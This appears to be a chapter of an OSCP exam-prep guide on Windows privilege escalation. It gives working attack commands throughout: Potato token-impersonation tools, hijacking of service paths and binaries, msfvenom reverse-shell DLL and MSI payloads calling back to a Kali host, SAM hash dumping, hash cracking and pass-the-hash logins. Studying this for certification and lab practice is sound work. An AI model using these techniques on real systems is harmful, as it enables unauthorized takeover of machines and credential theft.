# 10 — Windows Privilege Escalation

Windows privesc is fundamentally different from Linux. There's no `sudo -l` equivalent that shows you the answer. Instead, you're checking service configurations, registry settings, token privileges, and scheduled tasks. The attack surface is wider, but the enumeration takes more effort.

**On the OSCP exam:** At least one standalone machine will be Windows. Privesc is worth 10 of that machine's 20 points. The AD set is all Windows. You MUST be comfortable with Windows privesc.

---

## The Enumeration Sequence

Same approach as Linux — run these in order, starting with the fastest wins.

### Step 1: Who am I?

```cmd
whoami
whoami /priv
whoami /groups
net user %USERNAME%
```

**`whoami /priv` is the Windows equivalent of `sudo -l`.** Check it immediately.

### Step 2: Check token privileges (the #1 Windows privesc vector)

```cmd
whoami /priv
```

Output:
```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeImpersonatePrivilege        Impersonate a client           Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas           Disabled
```

**The privileges that give you SYSTEM:**

| Privilege | Exploit | Tools |
|---|---|---|
| `SeImpersonatePrivilege` | Potato attacks | PrintSpoofer, GodPotato, JuicyPotato, SweetPotato |
| `SeAssignPrimaryTokenPrivilege` | Potato attacks | Same tools as above |
| `SeBackupPrivilege` | Read any file (dump SAM/SYSTEM) | robocopy, reg save, diskshadow |
| `SeRestorePrivilege` | Write any file | Replace system binaries, DLL hijack |
| `SeDebugPrivilege` | Inject into any process | Migrate into a SYSTEM process |
| `SeLoadDriverPrivilege` | Load a malicious kernel driver | Capcom.sys exploit |
| `SeTakeOwnershipPrivilege` | Take ownership of any file/object | takeown + icacls |

**The most common scenario:** You get a shell as a service account (IIS, MSSQL, Apache, Tomcat). Service accounts almost always have `SeImpersonatePrivilege`. Potato attacks turn this into SYSTEM.

### Step 3: SeImpersonatePrivilege — Potato Attacks

**What Potato attacks do:** They abuse Windows' authentication mechanism to trick the SYSTEM account into authenticating to a process you control, then impersonate that token to get a SYSTEM shell.

**PrintSpoofer (simplest, works on Windows 10/Server 2016+):**

```cmd
# Upload PrintSpoofer64.exe to the target

# Get a SYSTEM shell
.\PrintSpoofer64.exe -i -c cmd
# or
.\PrintSpoofer64.exe -i -c powershell

# Verify
whoami
# nt authority\system
```

That's it. One command. If `SeImpersonatePrivilege` is enabled, PrintSpoofer gives you SYSTEM.

**GodPotato (newest, works on the widest range of Windows versions):**

```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
# nt authority\system

# Get a reverse shell
.\GodPotato.exe -cmd "cmd /c C:\temp\shell.exe"
# (where shell.exe is an MSFVenom reverse shell payload)
```

**JuicyPotato (older Windows — Server 2008/2012, Windows 7/8):**

```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\shell.exe" -t *
```

JuicyPotato needs a CLSID that varies by Windows version. Google "JuicyPotato CLSID [Windows version]" to find the right one.

**Which Potato to use:**

| Windows version | Tool |
|---|---|
| Server 2019/2022, Windows 10/11 | PrintSpoofer or GodPotato |
| Server 2016 | PrintSpoofer or GodPotato |
| Server 2008/2012, Windows 7/8 | JuicyPotato |
| Any version | GodPotato (most universal) |

### Step 4: Enumerate system info

```cmd
systeminfo
hostname
```

**Key things from systeminfo:**
- OS Name and Version (tells you which exploits apply)
- Hotfixes installed (missing patches = vulnerabilities)
- Domain name (if domain-joined)
- Architecture (x86 vs x64 — affects payload generation)

**Check for missing patches:**

```cmd
systeminfo
# Copy the output

# On Kali, use Windows Exploit Suggester
python windows-exploit-suggester.py --database 2026-07-20-mssb.xlsx --systeminfo sysinfo.txt
```

Or inside Meterpreter:
```
run post/multi/recon/local_exploit_suggester
```

### Step 5: Enumerate services

**Unquoted service paths** — one of the most common Windows privesc vectors.

```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**What is an unquoted service path?**

When a Windows service has a path with spaces and it's NOT wrapped in quotes:

```
Unquoted (vulnerable):   C:\Program Files\Vulnerable App\My Service\service.exe
Quoted (safe):            "C:\Program Files\Vulnerable App\My Service\service.exe"
```

Windows processes the unquoted path by trying each possible interpretation in order:

```
1. C:\Program.exe
2. C:\Program Files\Vulnerable.exe
3. C:\Program Files\Vulnerable App\My.exe
4. C:\Program Files\Vulnerable App\My Service\service.exe
```

If you can write a file to one of the earlier paths, Windows executes YOUR binary instead of the real service. Place a reverse shell payload:

```cmd
# Check if the directory is writable
icacls "C:\Program Files\Vulnerable App\"

# If writable, place your payload
copy C:\temp\shell.exe "C:\Program Files\Vulnerable App\My.exe"

# Restart the service (need permission or wait for reboot)
sc stop "ServiceName"
sc start "ServiceName"
# Service starts → tries C:\Program Files\Vulnerable App\My.exe first → runs your payload
```

**Weak service permissions:**

```cmd
# Check service permissions with accesschk
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" * /c
.\accesschk.exe /accepteula -uwcqv "Everyone" * /c
.\accesschk.exe /accepteula -uwcqv %USERNAME% * /c
```

If a service has `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` for your user, you can change what it runs:

```cmd
# Change the service binary path to your payload
sc config "VulnService" binPath= "C:\temp\shell.exe"

# Restart the service
sc stop "VulnService"
sc start "VulnService"
# Runs your payload as SYSTEM (services run as SYSTEM by default)
```

**Weak service binary permissions:**

```cmd
# Check permissions on the actual service executable
icacls "C:\Program Files\Some Service\service.exe"
```

If your user has write access to the service binary itself, replace it:

```cmd
# Backup the original
copy "C:\Program Files\Some Service\service.exe" C:\temp\backup.exe

# Replace with your payload
copy C:\temp\shell.exe "C:\Program Files\Some Service\service.exe"

# Restart the service
sc stop "ServiceName"
sc start "ServiceName"
```

### Step 6: DLL hijacking

When a program loads a DLL, Windows searches multiple directories in order. If you can place a malicious DLL in a directory that's searched BEFORE the legitimate one, your DLL loads instead.

```cmd
# Common DLL search order:
# 1. Directory of the application
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current directory
# 5. Directories in PATH

# Find services with missing DLLs (use Process Monitor from SysInternals)
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Generate a malicious DLL
# On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f dll -o evil.dll

# Place it where the application will find it
copy evil.dll "C:\Program Files\App\missing.dll"

# Restart the service/application
```

### Step 7: Registry checks

**AlwaysInstallElevated — instant SYSTEM via MSI:**

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If BOTH return `0x1` (enabled):

```bash
# On Kali — generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o evil.msi

# Transfer to target, then run
msiexec /quiet /qn /i evil.msi
# Runs as SYSTEM because AlwaysInstallElevated is on
```

**Autologon credentials:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for `DefaultUserName`, `DefaultPassword`, `DefaultDomainName`. These are cleartext credentials stored for automatic login.

**Saved credentials:**

```cmd
cmdkey /list
```

If you see saved credentials:
```cmd
runas /savecred /user:administrator cmd.exe
# Runs cmd as administrator using the saved password — no password prompt!
```

### Step 8: Scheduled tasks

```cmd
schtasks /query /fo list /v
```

Look for tasks that:
- Run as SYSTEM or Administrator
- Execute scripts/binaries you can modify
- Have writable paths

```cmd
# Check permissions on the task's binary
icacls "C:\path\to\scheduled\script.bat"

# If writable, inject your payload
echo C:\temp\shell.exe >> "C:\path\to\scheduled\script.bat"
```

### Step 9: Credential hunting

```cmd
# Search for files containing passwords
findstr /si "password" C:\*.txt C:\*.ini C:\*.config C:\*.xml
findstr /si "password" C:\Users\*.txt C:\Users\*.ini C:\Users\*.config

# Check common locations
type C:\Users\%USERNAME%\Desktop\*.txt
type C:\inetpub\wwwroot\web.config
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattend.xml

# PowerShell search
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"

# Check PowerShell history
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# SAM and SYSTEM backup files (if found, dump hashes)
dir C:\Windows\Repair\SAM
dir C:\Windows\Repair\SYSTEM
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
```

If you find SAM and SYSTEM files:

```bash
# Transfer to Kali
# Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Crack NTLM hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Or pass the hash (no cracking needed)
impacket-psexec administrator@TARGET -hashes aad3b435b51404ee:NTLM_HASH
evil-winrm -i TARGET -u administrator -H NTLM_HASH
```

### Step 10: Installed software

```cmd
# List installed programs
wmic product get name,version
# This is slow but thorough

# Quick check
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Check for specific vulnerable software
wmic product get name,version | findstr -i "apache\|tomcat\|mysql\|filezilla\|putty"
```

Check every installed application version against searchsploit.

---

## Automated Enumeration

### WinPEAS (the best all-in-one for Windows)

```cmd
# Transfer winpeas.exe to target
.\winpeas.exe
```

Like LinPEAS for Linux — checks everything automatically and color-codes the results. Run it first, read the output carefully.

### PowerUp.ps1

```powershell
# Load it
. .\PowerUp.ps1

# Run all checks
Invoke-AllChecks
```

Specifically checks for service misconfigurations, unquoted paths, and registry issues.

### Seatbelt

```cmd
.\Seatbelt.exe -group=all
```

Comprehensive system survey — more detailed than WinPEAS in some areas.

---

## The Windows Privesc Checklist (print this)

```
□ whoami /priv (token privileges — SeImpersonate?)
□ whoami /groups
□ systeminfo (OS version, hotfixes, domain)
□ Unquoted service paths (wmic service get ...)
□ Weak service permissions (accesschk)
□ Weak service binary permissions (icacls)
□ AlwaysInstallElevated (reg query)
□ Autologon credentials (reg query Winlogon)
□ Saved credentials (cmdkey /list → runas /savecred)
□ Scheduled tasks (schtasks /query → check permissions on scripts)
□ Credential hunting (findstr /si password, PowerShell history)
□ SAM/SYSTEM backup files
□ Installed software versions (searchsploit each one)
□ Run WinPEAS
□ Run PowerUp.ps1 Invoke-AllChecks
```

---

## Lab: Practice Windows Privesc

### On your Windows 11 VM

```cmd
# Create a test user (as administrator)
net user testuser TestPass123! /add

# Create a vulnerable service with an unquoted path
mkdir "C:\Program Files\Vuln App\Sub Dir"
copy C:\Windows\System32\cmd.exe "C:\Program Files\Vuln App\Sub Dir\service.exe"
sc create VulnService binPath= "C:\Program Files\Vuln App\Sub Dir\service.exe" start= auto

# Give testuser SeImpersonatePrivilege (add to IIS group or use secpol.msc)
# Or just practice the enumeration — identify what privileges you have

# Create a scheduled task with a writable script
echo @echo off > C:\scripts\backup.bat
echo echo backup ran >> C:\scripts\backup.bat
schtasks /create /tn "Backup" /tr "C:\scripts\backup.bat" /sc minute /mo 1 /ru SYSTEM

# Make the script writable
icacls C:\scripts\backup.bat /grant Everyone:(F)
```

### Practice as testuser

```cmd
# Login as testuser
runas /user:testuser cmd.exe

# Enumerate
whoami /priv
whoami /groups
systeminfo
wmic service get name,pathname | findstr /i /v """
schtasks /query /fo list /v | findstr /i "task\|run\|folder"
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
findstr /si "password" C:\*.txt
```

---

## Exam Tips for Windows Privesc

1. **Check `whoami /priv` immediately.** If you see `SeImpersonatePrivilege`, upload PrintSpoofer or GodPotato and you're done. This is the fastest Windows privesc.

2. **Run WinPEAS early.** Let it scan while you manually check other things. Read its output thoroughly.

3. **Service exploits are the second most common path.** Unquoted paths and weak service permissions appear frequently on OSCP machines.

4. **Don't forget credential hunting.** web.config, PowerShell history, Unattend.xml — passwords in files are a real privesc vector.

5. **AlwaysInstallElevated is a gift.** If both registry keys return 0x1, generate an MSI payload and you have SYSTEM instantly.

6. **Pass the hash works.** If you dump hashes from SAM, you don't always need to crack them. PtH with `impacket-psexec` or `evil-winrm` is often faster.

7. **Know your tools:** PrintSpoofer for SeImpersonate, PowerUp for service misconfigs, WinPEAS for everything else.
